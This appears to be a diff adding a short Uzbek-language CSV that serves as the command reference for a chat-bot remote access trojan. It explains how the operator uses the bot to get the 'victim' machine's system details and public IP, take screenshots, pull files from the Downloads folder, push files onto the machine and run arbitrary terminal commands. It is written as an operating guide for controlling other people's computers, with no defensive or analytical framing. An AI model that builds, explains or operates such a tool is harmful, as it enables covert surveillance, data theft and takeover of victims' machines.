@@ -1,0 +1,8 @@
+Buyruq,Vazifasi,Natija
+/start,Botning holatini tekshirish,"""✨ System Connected"" xabari keladi."
+/info,Tizim ma'lumotlarini olish,"CPU modeli, yuklamasi, OS va Uptime haqida hisobot."
+/ip,IP manzilni aniqlash,Qurbonning tashqi (Public) IP manzilini yuboradi.
+/screen,Ekranni rasmga olish,Kompyuter ekranining joriy holatini .png formatida yuboradi.
+/get fayl_nomi.exe,Faylni yuklab olish,Downloads papkasidagi ko'rsatilgan faylni sizga yuboradi.
+Fayl yuborish,"Botga biror faylni ""Document"" qilib yuboring",Faylni avtomatik qurbonning Downloads papkasiga saqlaydi (Push).
+Istalgan matn,Terminal buyruqlari,"Masalan: dir, whoami, tasklist. Natijani matn ko'rinishida qaytaradi."
